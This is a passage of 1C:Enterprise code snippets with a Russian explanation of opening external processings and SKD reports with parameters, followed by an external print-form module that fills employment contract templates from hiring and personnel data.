        ОткрытьФорму(""ВнешняяОбработка."" + ИмяОбработкиСлужебное + "".Форма"", ПараметрыОткрытия, РодительскаяФорма);
    КонецЕсли;
КонецПроцедуры

&НаСервере
Функция ПолучитьСсылкуНаВнешнийОтчетОбработкуПоИмениНаСервере(ИмяОтчетаОбработки)
    Возврат Справочники.ДополнительныеОтчетыИОбработки.НайтиПоНаименованию(ИмяОтчетаОбработки).Ссылка;
КонецФункции

Процедуры:
ОткрытьВнешнююОбработку - пример обработки команды запуска внешней обработки без передачи параметров.
ОткрытьВнешнююОбработкуСПараметром  - пример обработки команды запуска внешней обработки с передачей одного параметра.
ОткрытьВнешнийОтчетСКД - пример обработки команды запуска СКД отчета без передачи параметров.
ОткрытьВнешнийОтчетСКДсПараметром - пример обработки команды запуска СКД отчета с передачей параметров отбора.
ПолучитьСсылкуНаВнешнийОтчетОбработкуПоИмениНаСервере - служебная функция, выполняемая на сервере, получающая ссылку на экземпляр отчета (обработки) по имени, заданном в ""Дополнительные отчеты и обработки"".
ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами - общая процедура,  непосредственно осуществляющая открытие. Внутри нее как раз строка кода вызывающая стандартную функцию из БСП (выгружает вызываемый отчет/обработку и передает ее наименование, чтобы к нему можно было обратиться по имени при открытии формы):
ИмяОбработкиСлужебное = ДополнительныеОтчетыИОбработкиВызовСервера.ПодключитьВнешнююОбработку(ВнешнийОтчетОбработкаДляОткрытияСсылка);

////////////////////////////////////////////////////////////////////////////////
// ОТЧЕТ СКД
 
Если вызывается отчет на СКД, то обязательно нужно создать для него типовую форму. Подробнее см. Как добавить типовую форму для СКД
Чтобы сработал код передачи параметров в СКД (ОткрытьВнешнийОтчетСКДсПараметром), нужно в модуле объекта СКД добавить код, принимающий эти параметры:

Процедура ПриКомпоновкеРезультата(ДокументРезультат, ДанныеРасшифровки, СтандартнаяОбработка)
    ЗаполнитьПользовательскиеНастройки();
КонецПроцедуры

Процедура ЗаполнитьПользовательскиеНастройки()      
    ДополнительныеСвойства = КомпоновщикНастроек.ПользовательскиеНастройки.ДополнительныеСвойства;
    Если Не ДополнительныеСвойства.Количество() Тогда
        Возврат;
    КонецЕсли;                                        
    Параметры = КомпоновщикНастроек.Настройки.ПараметрыДанных.Элементы;
    Отборы    = КомпоновщикНастроек.Настройки.Отбор.Элементы;   
    Для каждого Элемент Из Параметры Цикл                          
        ИмяПараметра = Строка(Элемент.Параметр);
        ЗначениеПараметра = Неопределено;                 
        Если ДополнительныеСвойства.Свойство(ИмяПараметра, ЗначениеПараметра) Тогда
            Настройка = КомпоновщикНастроек.ПользовательскиеНастройки.Элементы.Найти(Элемент.ИдентификаторПользовательскойНастройки);
            Настройка.Значение      = ЗначениеПараметра;
            Настройка.Использование = Истина;
        КонецЕсли;    
    КонецЦикла;  
    Для каждого Элемент Из Отборы Цикл    
        ИмяПараметра = Строка(Элемент.ЛевоеЗначение);
        ЗначениеПараметра = Неопределено;     
        Если ДополнительныеСвойства.Свойство(ИмяПараметра, ЗначениеПараметра) Тогда
            Настройка = КомпоновщикНастроек.ПользовательскиеНастройки.Элементы.Найти(Элемент.ИдентификаторПользовательскойНастройки);
            //Настройка.ВидСравнения   = ВидСравненияКомпоновкиДанных.Равно;
            Настройка.ПравоеЗначение = ЗначениеПараметра;
            Настройка.Использование  = Истина;
        КонецЕсли;        
    КонецЦикла;  
    КомпоновщикНастроек.ПользовательскиеНастройки.ДополнительныеСвойства.Очистить(); 
КонецПроцедуры

Скачать пример данного СКД отчета можно в конце статьи.

Также пробовала передавать параметры в СКД вот так:

&НаКлиенте
Процедура ОткрытьВнешнийОтчетСКДсПараметром(Команда)  
    // установка параметров отбора
    Отбор = Новый Структура;
    Отбор.Вставить(НазваниеПараметра, ЗначениеПараметра);
    ПараметрыОтчета = Новый Структура;
    ПараметрыОтчета.Вставить(""Отбор"", Отбор);
    ПараметрыОтчета.Вставить(""СформироватьПриОткрытии"", Истина);
    ОткрытьВнешнийОтчетОбработкуПоИмениСДопПараметрами (""ВнешнийОтчетСКДПример"", ПараметрыОтчета, Истина);
КонецПроцедуры

Однако возникала ошибка:
Невозможно применить фиксированные настройки. Пересекаются элементы отбора."}
},
{0,
{"ВнешняяОбработкаОткрытьФорму",0,0,"","&НаКлиенте
Процедура ВнешняяОбработкаОткрытьФорму(пНаименованиеОбработки, пИмяФормы = ""Форма"")
	
	лВнешняяОбработка = ДополнительныеОтчетыИОбработкиНайтиПоНаименованию(пНаименованиеОбработки);
	Если лВнешняяОбработка.Пустая() Тогда // Значит печать надо обычными средствами
		Возврат;
	КонецЕсли;
	
	//лОбъектыНазначения = Новый Массив;
	//лОбъектыНазначения.Добавить(Объект.Ссылка);
	
	лИмяОбработкиСлужебное 	= ДополнительныеОтчетыИОбработкиВызовСервера.ПодключитьВнешнююОбработку(лВнешняяОбработка);
	лВнешняяОбработкаФормы 	= ПолучитьФорму(""ВнешняяОбработка."" + лИмяОбработкиСлужебное + ""."" + пИмяФормы);
	
	лВнешняяОбработкаФормы.ВыполнитьКоманду(""Идентификатор"", лОбъектыНазначения,);
	
	лВнешняяОбработкаФормы.Открыть();
	
КонецПроцедуры

&НаСервереБезКонтекста
Функция ДополнительныеОтчетыИОбработкиНайтиПоНаименованию(пНаименованиеОбработки)
	лДополнительныеОтчетыИОбработки = Справочники.ДополнительныеОтчетыИОбработки.НайтиПоНаименованию(пНаименованиеОбработки);
	Возврат лДополнительныеОтчетыИОбработки;
КонецФункции"}
},
{0,
{"ВПФ через ООП",0,0,"","#Область ОписаниеИзменений
// hrm.3.ssa.base-3.1.4.164-1.0.0.0 KVADRUM<avb@1c89.ru> #1 Добавить печатную форму трудового договора
// hrm.3.ssa.base-3.1.6.6-1.0.3.0 KVADRUM<avb@1c89.ru> #5 Изменить печатные формы по приложенным шаблонам
// hrm.3.ssa.base-3.1.6.6-1.0.3.1 KVADRUM<avb@1c89.ru> #6 В место работы добавить территорию, на которую принимается сотрудник
// hrm.3.ssa.base-3.1.6.6-1.0.3.1 KVADRUM<avb@1c89.ru> #8 Изменить способ отображения длительности испытательного срока если он не кратен месяцу
// hrm.3.ssa.base-3.1.6.6-1.0.3.1 KVADRUM<avb@1c89.ru> #7 Неверно указываются даты начала и окончания действия договора
// hrm.3.ssa.base-3.1.6.6-1.0.3.1 KVADRUM<avb@1c89.ru> #9 Неправильно формируется п. 5.5.6
// hrm.3.ssa.base-3.1.6.6-1.0.3.1 KVADRUM<avb@1c89.ru> #10 Не формируется значение ОГРН
#КонецОбласти
#Область ОбластьОпределенияПеременных

#Область ОпределениеПеременных_ООП

Перем ООП_Classes; // Коллекция зарегистрированных классов используемых в обработке
Перем ООП_ClassInstances; // Коллекция созданных экземпляров классов

#КонецОбласти //ОпределениеПеременных_ООП//

Перем мДлинаЗемныхСуток;

#КонецОбласти //ОбластьОпределенияПеременных//
#Область ПрограммныйИнтерфейс

// Интерфейс для регистрации обработки.
// Вызывается при добавлении обработки в справочник ""ВнешниеОбработки""
//
// Возвращаемое значение:
// Структура:
// Вид - строка - возможные значения:	""ДополнительнаяОбработка""
//										""ДополнительныйОтчет""
//										""ЗаполнениеОбъекта""
//										""Отчет""
//										""ПечатнаяФорма""
//										""СозданиеСвязанныхОбъектов""
//
// Назначение - массив строк имен объектов метаданных в формате:
//			<ИмяКлассаОбъектаМетаданного>.[ * | <ИмяОбъектаМетаданных>]
//			Например, ""Документ.СчетЗаказ"" или ""Справочник.*""
//			Прим. параметр имеет смысл только для назначаемых обработок
//
// Наименование - строка - наименование обработки, которым будет заполнено
//						наименование справочника по умолчанию - краткая строка для
//						идентификации обработки администратором
//
// Версия - строка - версия обработки в формате <старший номер>.<младший номер>
//					используется при загрузке обработок в информационную базу
// БезопасныйРежим – Булево – Если истина, обработка будет запущена в безопасном режиме.
//							Более подбробная информация в справке.
//
// Информация - Строка- краткая информация по обработке, описание обработки
//
// ВерсияБСП - Строка - Минимальная версия БСП, на которую рассчитывает код
// дополнительной обработки. Номер версии БСП задается в формате «РР.ПП.ВВ.СС»
// (РР – старший номер редакции; ПП – младший номер ре-дакции; ВВ – номер версии; СС – номер сборки).
//
// Команды - ТаблицаЗначений - команды, поставляемые обработкой, одная строка таблицы соотвествует
//							одной команде
//				колонки: 
//				 - Представление - строка - представление команды конечному пользователю
//				 - Идентификатор - строка - идентефикатор команды. В случае печатных форм
//											перечисление через запятую списка макетов
//				 - Использование - строка - варианты запуска обработки:
//						""ОткрытиеФормы"" - открыть форму обработки
//						""ВызовКлиентскогоМетода"" - вызов клиентского экспортного метода из формы обработки
//						""ВызовСерверногоМетода"" - вызов серверного экспортного метода из модуля объекта обработки
//				 - ПоказыватьОповещение – Булево – если Истина, требуется оказывать оповещение при начале
//								и при окончании запуска обработки. Прим. Имеет смысл только
//								при запуске обработки без открытия формы.
//				 - Модификатор – строка - для печатных форм MXL, которые требуется
//										отображать в форме ПечатьДокументов подсистемы Печать
//										требуется установить как ""ПечатьMXL""
//
Функция СведенияОВнешнейОбработке() Экспорт
	
	Перем СведенияОВнешнейОбработке;
	
	СведенияОВнешнейОбработке = ДополнительныеОтчетыИОбработки.СведенияОВнешнейОбработке(""2.4.4.106"");
	
	СведенияОВнешнейОбработке.Вид              = ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиПечатнаяФорма();
	СведенияОВнешнейОбработке.Версия           = ""1.0.3.1"";
	СведенияОВнешнейОбработке.БезопасныйРежим  = Ложь;
	СведенияОВнешнейОбработке.Назначение.Добавить(""Документ.ПриемНаРаботу"");
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (вредники)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорВредники"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (вредники-льготники)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорВредникиЛьготники"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (ИТР вахта РКС)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорИТРВахтаРКС"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (ИТР основной график РКС)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (ИТР совместительство РКС)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (рабочие вахта РКС)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (рабочие основной график РКС)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;
	
	НоваяКоманда = СведенияОВнешнейОбработке.Команды.Добавить();
	НоваяКоманда.Представление         = НСтр(""ru = 'Печатная форма: Трудовой договор (сдельные расценки)'"");
	НоваяКоманда.Идентификатор         = ""ПФ_MXL_ТрудовойДоговорСдельныеРасценки"";
	НоваяКоманда.Использование         = ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыВызовСерверногоМетода();
	НоваяКоманда.Модификатор           = ""ПечатьMXL"";
	НоваяКоманда.ПоказыватьОповещение  = Ложь;

	
	Возврат СведенияОВнешнейОбработке;
	
КонецФункции

Функция Печать(МассивОбъектов, КоллекцияПечатныхФорм, ОбъектыПечати, ПараметрыВывода = Неопределено) Экспорт
	Перем Печать;
	
	ИменаМакетов = Новый Массив;
	Для каждого ПечатнаяФорма Из КоллекцияПечатныхФорм Цикл
		ИменаМакетов.Добавить(ПечатнаяФорма.ИмяМакета);	
	КонецЦикла;
	
	МакетыИДанные  = ООП_Новый(""МакетыИДанные"");
	МакетыИДанные  = МакетыИДанные_Создать(МакетыИДанные, МассивОбъектов, ИменаМакетов);
	
	Для каждого ИмяМакета Из ИменаМакетов Цикл
		
		Если УправлениеПечатью.НужноПечататьМакет(КоллекцияПечатныхФорм, ИмяМакета) Тогда
			
			ТабличныйДокумент = Новый ТабличныйДокумент;
			
			НомерТипаДокумента = 0;
			Для каждого СсылкаНаОбъект Из МассивОбъектов Цикл
				
				НомерТипаДокумента = НомерТипаДокумента + 1;
				Если НомерТипаДокумента > 1 Тогда
					ТабличныйДокумент.ВывестиГоризонтальныйРазделительСтраниц();
				КонецЕсли;
				
				ТабличныйДокумент.Вывести(МакетыИДанные_ПечатьМакетаОбъекта(МакетыИДанные, СсылкаНаОбъект, ИмяМакета)); //исполняющая функция (в этом же модуле)	
				
			КонецЦикла; 
			
			ТабличныйДокумент.АвтоМасштаб = Истина;
			ТабличныйДокумент.ИмяПараметровПечати = ""ПАРАМЕТРЫ_ПЕЧАТИ_"" + ИмяМакета;
			ТабличныйДокумент.ОтображатьГруппировки = Ложь;
			ТабличныйДокумент.ОтображатьЗаголовки = Ложь;
			ТабличныйДокумент.ОтображатьСетку = Ложь;
			ТабличныйДокумент.ТолькоПросмотр = Истина;
			ТабличныйДокумент.ПолеСверху = 5;
			ТабличныйДокумент.ПолеСнизу = 5;
			ТабличныйДокумент.ПолеСлева = 20;
			ТабличныйДокумент.ПолеСнизу = 5;
			ТабличныйДокумент.ОриентацияСтраницы = ОриентацияСтраницы.Портрет;
			
			
			УправлениеПечатью.ВывестиТабличныйДокументВКоллекцию(КоллекцияПечатныхФорм
			, ИмяМакета //тот же - что и в функции ""СведенияОВнешнейОбработке""! 
			, ""Печатная форма: Акт передачи материалов в эксплуатацию""
			, ТабличныйДокумент
			);	
			
		КонецЕсли;
		
	КонецЦикла; 
	
	Если ( 0 <> КоллекцияПечатныхФорм.Количество() ) Тогда
		Печать = КоллекцияПечатныхФорм[0].ТабличныйДокумент;
	Иначе
		Печать = Новый ТабличныйДокумент;
	КонецЕсли; 
	
	Возврат Печать;
	
КонецФункции

#КонецОбласти

#Область class_Документ_ПриемНаРаботу

// public
Функция Документ_ПриемНаРаботу_Создать(Знач Документ_ПриемНаРаботу, Знач СсылкаНаОбъект, Знач ИменаМакетов) Экспорт
	
	Перем Документ_ПриемНаРаботу_Создать; // Возвращаемое значение
	Перем ПараметрыЗапроса;
	Перем СведенияОбОрганизации;
	
	Перем Документ_ДанныеИзБД;
	Перем Организация, Спецификация;
	Перем Руководитель;
	Перем Сотрудники;
	
	Перем Регистратор;
	Перем ТерриториальныеУсловия;
	
	Документ_ПриемНаРаботу_Создать = Неопределено;
	
	МассивОбъектов = Новый Массив;
	МассивОбъектов.Добавить(СсылкаНаОбъект);
	Документ_ДанныеИзБД = Запрос_Создать(Новый Запрос(), ""Объект"", Новый Структура(""Ссылка"", СсылкаНаОбъект)).Выполнить().Выбрать();
	
	Если ( Ложь = Документ_ДанныеИзБД.Следующий() ) Тогда
		Возврат Документ_ПриемНаРаботу_Создать;
	КонецЕсли; 
	
	Договор = Документ_ПриемНаРаботу;
	Организация = Договор.Организация;
	Руководитель = Организация.ОтветственныеЛица[""Руководитель""];
	Сотрудник = Договор.Сотрудник;
	УсловияТрудаНаРабочемМесте = Договор.УсловияТрудаНаРабочемМесте;
	ОплатаТруда = Договор.ОплатаТруда;
	РасчетныйСчет = Организация.РасчетныйСчет;
	Банк = РасчетныйСчет.Банк;
	
	Организация.Ссылка = Документ_ДанныеИзБД.Организация;
	Сотрудник.Ссылка = Документ_ДанныеИзБД.Сотрудник;
	Руководитель.Ссылка = Документ_ДанныеИзБД.Руководитель;
	Руководитель.Должность.Ссылка = Документ_ДанныеИзБД.ДолжностьРуководителя;
	
	КадровыеДанныеСотрудников = Документ_ПриемНаРаботу_КадровыеДанныеСотрудников(ОбщегоНазначенияКлиентСервер.ЗначениеВМассиве(Сотрудник.Ссылка), Документ_ДанныеИзБД.Дата);
	КадровыеДанныеСотрудника = КадровыеДанныеСотрудников.Найти(Сотрудник.Ссылка);
	Если (Неопределено = КадровыеДанныеСотрудника) Тогда
		ВызватьИсключение ""Для сотрудника "" + Сотрудник.Ссылка + "" отсутствуют кадровые данные"";
	КонецЕсли; 
	
	Начисления = Документ_ПриемНаРаботу_НачисленияСотрудника(Сотрудник.Ссылка, КонецДня(Документ_ДанныеИзБД.ДатаПриема));

#Область Договор
	
	Договор.НомерТрудовогоДоговора = Документ_ДанныеИзБД.ТрудовойДоговорНомер;
	Договор.ДатаТрудовогоДоговора = Документ_ДанныеИзБД.ТрудовойДоговорДата;
	Договор.ВидЗанятости = Документ_ДанныеИзБД.ВидЗанятости;
	Договор.ДатаПриема = Документ_ДанныеИзБД.ДатаПриема;
	
	ТерриториальныеУсловия = Документ_ПриемНаРаботу_ТерриториальныеУсловияПФРПСтруктурнойЕдиницы(Документ_ДанныеИзБД.Территория, Договор.ДатаТрудовогоДоговора);
	Договор.ТерриториальныеУсловия = ?(Неопределено = Договор.ТерриториальныеУсловия, ТерриториальныеУсловия, Договор.ТерриториальныеУсловия);
	ТерриториальныеУсловия = Документ_ПриемНаРаботу_ТерриториальныеУсловияПФРПСтруктурнойЕдиницы(Документ_ДанныеИзБД.Подразделение, Договор.ДатаТрудовогоДоговора);
	Договор.ТерриториальныеУсловия = ?(Неопределено = Договор.ТерриториальныеУсловия, ТерриториальныеУсловия, Договор.ТерриториальныеУсловия);
	ТерриториальныеУсловия = Документ_ПриемНаРаботу_ТерриториальныеУсловияПФРПСтруктурнойЕдиницы(Документ_ДанныеИзБД.Организация, Договор.ДатаТрудовогоДоговора);
	Договор.ТерриториальныеУсловия = ?(Неопределено = Договор.ТерриториальныеУсловия, ТерриториальныеУсловия, Договор.ТерриториальныеУсловия);
	
	Договор.ДлительностьИспытательногоСрока = Документ_ДанныеИзБД.ДлительностьИспытательногоСрока;
	Договор.ДатаНачала = КадровыеДанныеСотрудника.ДатаНачала;
	Договор.ДатаОкончания = КадровыеДанныеСотрудника.ДатаОкончания;

#КонецОбласти
	#Область Организация
	СведенияОбОрганизации = Документ_ПриемНаРаботу_СведенияОбОрганизации(Организация.Ссылка, Документ_ДанныеИзБД.Дата);
		
	Организация.Наименования[""Полное""] = СведенияОбОрганизации.НаименованиеПолное;
	Организация.Наименования[""Краткое""] = СведенияОбОрганизации.НаименованиеКраткое;
	Организация.Адреса[""Юридический""] = СведенияОбОрганизации.АдресЮридический;
	Организация.Адреса[""Почтовый""] = СведенияОбОрганизации.АдресПочтовый;
	Организация.Факс = СведенияОбОрганизации.Факс;
	Организация.Телефон = СведенияОбОрганизации.Телефон;
	Организация.Email = СведенияОбОрганизации.Email;
	Организация.ИНН = СведенияОбОрганизации.ИНН;
	Организация.КПП = СведенияОбОрганизации.КПП;
	Организация.ОГРН = СведенияОбОрганизации.ОГРН;
	                                
	#КонецОбласти 	
	#Область РасчетныйСчетБанк
	
	РасчетныйСчет_ДанныеИзБД = Запрос_Создать(Новый Запрос(), ""РасчетныйСчет"", Новый Структура(""Ссылка"", КадровыеДанныеСотрудника.ЗарплатныйПроект)).Выполнить().Выбрать();
		
	Если (РасчетныйСчет_ДанныеИзБД.Следующий()) Тогда
		
		РасчетныйСчет.Номер = РасчетныйСчет_ДанныеИзБД.Номер;
		Банк.Наименование = РасчетныйСчет_ДанныеИзБД.БанкНаименование;
		Банк.Город = РасчетныйСчет_ДанныеИзБД.БанкГород;
		Банк.КорреспондентскийСчет = РасчетныйСчет_ДанныеИзБД.БанкКорреспондентскийСчет;
		Банк.БИК = РасчетныйСчет_ДанныеИзБД.БанкБИК;
		
	КонецЕсли; 
		

	#КонецОбласти
	#Область Руководитель
	
	КадровыеДанныеФизическихЛиц = Документ_ПриемНаРаботу_КадровыеДанныеФизическихЛиц(ОбщегоНазначенияКлиентСервер.ЗначениеВМассиве(Руководитель.Ссылка), Документ_ДанныеИзБД.Дата);
	КадровыеДанныеРуководителя = КадровыеДанныеФизическихЛиц.Найти(Руководитель.Ссылка);
	Если (НЕ Неопределено = КадровыеДанныеРуководителя) Тогда
		
		Руководитель.Пол = КадровыеДанныеРуководителя.Пол;
		
		Стандартные_Должность_Наименование(Руководитель.Должность, Строка(Руководитель.Должность.Ссылка));
		
		Стандартные_ФИО_Установить(Руководитель.ФИО, КадровыеДанныеРуководителя);
		Если (ПустаяСтрока(Стандартные_ФИО_ФамилияИмяОтчество(Руководитель.ФИО))) Тогда
			Стандартные_ФИО_Установить(Руководитель.ФИО, КадровыеДанныеРуководителя.ФИО);
		КонецЕсли; 
		
	КонецЕсли; 
	
	#КонецОбласти 
	#Область Сотрудник
		
	Стандартные_Должность_Наименование(Сотрудник.Должность, Документ_ДанныеИзБД.ДолжностьНаименование);
	Стандартные_Подразделение_Наименование(Сотрудник.Подразделение, Документ_ДанныеИзБД.ПодразделениеНаименование);
	Сотрудник.ТерриторияВыполненияРабот = Документ_ДанныеИзБД.Территория;
	Сотрудник.ДатаРождения = КадровыеДанныеСотрудника.ДатаРождения;
	Сотрудник.УдостоверениеЛичности.Представление = КадровыеДанныеСотрудника.ДокументПредставление;
	Сотрудник.УдостоверениеЛичности.Серия = КадровыеДанныеСотрудника.ДокументСерия;
	Сотрудник.УдостоверениеЛичности.Номер = КадровыеДанныеСотрудника.ДокументНомер;
	Сотрудник.УдостоверениеЛичности.КемВыдан = КадровыеДанныеСотрудника.ДокументКемВыдан;
	Сотрудник.УдостоверениеЛичности.ДатаВыдачи = КадровыеДанныеСотрудника.ДокументДатаВыдачи;
	Сотрудник.УдостоверениеЛичности.КодПодразделения = КадровыеДанныеСотрудника.ДокументКодПодразделения;
	Сотрудник.АдресРегистрации = КадровыеДанныеСотрудника.АдресПоПропискеПредставление;
	Сотрудник.ИНН = КадровыеДанныеСотрудника.ИНН; 
	Сотрудник.СНИЛС = КадровыеДанныеСотрудника.СтраховойНомерПФР; 
	Сотрудник.ТелефонМобильный = КадровыеДанныеСотрудника.ТелефонМобильныйПредставление; 
	Сотрудник.Страна = КадровыеДанныеСотрудника.Страна; 
	
	Стандартные_ФИО_Установить(Сотрудник.ФИО, КадровыеДанныеСотрудника);
	Если (ПустаяСтрока(Стандартные_ФИО_ФамилияИмяОтчество(Сотрудник.ФИО))) Тогда
			Стандартные_ФИО_Установить(Сотрудник.ФИО, КадровыеДанныеСотрудника.ФИО);
	КонецЕсли; 
	

	#КонецОбласти 
	#Область ОплатаТруда
		
	ОплатаТруда.ОкладСтавка = ?(Неопределено = Начисления.ОсновноеНачисление, 0, Начисления.ОсновноеНачисление.ЗначениеОсновногоПоказателя);
	ОплатаТруда.ОсновнойПоказатель = ?(Неопределено = Начисления.ОсновноеНачисление, Справочники.ПоказателиРасчетаЗарплаты.ПустаяСсылка(), Начисления.ОсновноеНачисление.ОсновнойПоказатель);
	ОплатаТруда.СтавкаНДФЛ = УчетНДФЛ.СтавкаНДФЛ(Перечисления.НДФЛСтавкиНалогообложенияРезидента.Ставка13, Справочники.ВидыДоходовНДФЛ.КодДоходаПоУмолчанию, КадровыеДанныеСотрудника.СтатусНалогоплательщика, Год(Договор.ДатаТрудовогоДоговора));
	ОплатаТруда.РайонныйКоэффициент = ?(Неопределено = Начисления.РайонныйКоэффициент, 0, Начисления.РайонныйКоэффициент.ЗначениеОсновногоПоказателя);;
	
	#КонецОбласти	
	#Область УсловияТрудаНаРабочемМесте
		
	УсловияТрудаНаРабочемМесте.Вид = КадровыеДанныеСотрудника.КлассУсловийТруда;
		
	#КонецОбласти	
	
  	Документ_ПриемНаРаботу_Создать = Документ_ПриемНаРаботу;
	
	Возврат Документ_ПриемНаРаботу_Создать;
	
КонецФункции // Документ_ПриемНаРаботу_Создать

// protected
Функция Документ_ПриемНаРаботу_КадровыеДанныеСотрудников(Знач Сотрудники, Знач Дата)

	Перем Документ_ПриемНаРаботу_КадровыеДанныеСотрудников; // Возвращаемое значение
		
	ТребуемыеКадровыеДанные = Новый Массив();
	ТребуемыеКадровыеДанные.Добавить(""ФИО"");
	ТребуемыеКадровыеДанные.Добавить(""Фамилия"");
	ТребуемыеКадровыеДанные.Добавить(""Имя"");
	ТребуемыеКадровыеДанные.Добавить(""Отчество"");
	ТребуемыеКадровыеДанные.Добавить(""ВидЗанятости"");
	ТребуемыеКадровыеДанные.Добавить(""Страна"");
	ТребуемыеКадровыеДанные.Добавить(""ДатаРождения"");
	ТребуемыеКадровыеДанные.Добавить(""КлассУсловийТруда"");
	ТребуемыеКадровыеДанные.Добавить(""Организация"");
	ТребуемыеКадровыеДанные.Добавить(""Подразделение"");
	ТребуемыеКадровыеДанные.Добавить(""Территория"");
	ТребуемыеКадровыеДанные.Добавить(""СтатусНалогоплательщика"");
	ТребуемыеКадровыеДанные.Добавить(""ДокументПредставление"");
	ТребуемыеКадровыеДанные.Добавить(""ДокументСерия"");
	ТребуемыеКадровыеДанные.Добавить(""ДокументНомер"");
	ТребуемыеКадровыеДанные.Добавить(""ДокументКемВыдан"");
	ТребуемыеКадровыеДанные.Добавить(""ДокументДатаВыдачи"");
	ТребуемыеКадровыеДанные.Добавить(""ДокументКодПодразделения"");
	ТребуемыеКадровыеДанные.Добавить(""АдресПоПропискеПредставление"");
	ТребуемыеКадровыеДанные.Добавить(""ИНН"");
	ТребуемыеКадровыеДанные.Добавить(""СтраховойНомерПФР"");
	ТребуемыеКадровыеДанные.Добавить(""ЗарплатныйПроект"");
	ТребуемыеКадровыеДанные.Добавить(""ТарифнаяСтавка"");
	ТребуемыеКадровыеДанные.Добавить(""ПроцентСевернойНадбавки"");
	ТребуемыеКадровыеДанные.Добавить(""ТелефонМобильныйПредставление"");
	ТребуемыеКадровыеДанные.Добавить(""ДатаНачала"");
	ТребуемыеКадровыеДанные.Добавить(""ДатаОкончания"");
	
	
	Документ_ПриемНаРаботу_КадровыеДанныеСотрудников = КадровыйУчет.КадровыеДанныеСотрудников(Истина, Сотрудники, ТребуемыеКадровыеДанные, Дата);
		
	Возврат Документ_ПриемНаРаботу_КадровыеДанныеСотрудников;

КонецФункции // Документ_ПриемНаРаботу_КадровыеДанныеСотрудников()
Функция Документ_ПриемНаРаботу_КадровыеДанныеФизическихЛиц(Знач ФизическиеЛица, Знач ДатаДолученияДанных)

	Перем Документ_ПриемНаРаботу_КадровыеДанныеФизическихЛиц; // Возвращаемое значение
		
	ТребуемыеКадровыеДанные = Новый Массив();
	ТребуемыеКадровыеДанные.Добавить(""ФИО"");
	ТребуемыеКадровыеДанные.Добавить(""Фамилия"");
	ТребуемыеКадровыеДанные.Добавить(""Имя"");
	ТребуемыеКадровыеДанные.Добавить(""Отчество"");
	ТребуемыеКадровыеДанные.Добавить(""Пол"");
	
	Документ_ПриемНаРаботу_КадровыеДанныеФизическихЛиц = КадровыйУчет.КадровыеДанныеФизическихЛиц(Истина, ФизическиеЛица, ТребуемыеКадровыеДанные, ДатаДолученияДанных);
		
	Возврат Документ_ПриемНаРаботу_КадровыеДанныеФизическихЛиц;

КонецФункции // Документ_ПриемНаРаботу_КадровыеДанныеСотрудников()
Функция Документ_ПриемНаРаботу_СведенияОбОрганизации(Знач Организация, Знач ДатаПолученияДанных)

	Перем Документ_ПриемНаРаботу_СведенияОбОрганизации;
	
	СведенияОбОрганизации = Новый Структура;
	
	Сведения = Новый СписокЗначений;
	Сведения.Добавить("""", ""НаимЮЛПол"");
	Сведения.Добавить("""", ""НаимЮЛкрат"");
	Сведения.Добавить("""", ""ИННЮЛ"");
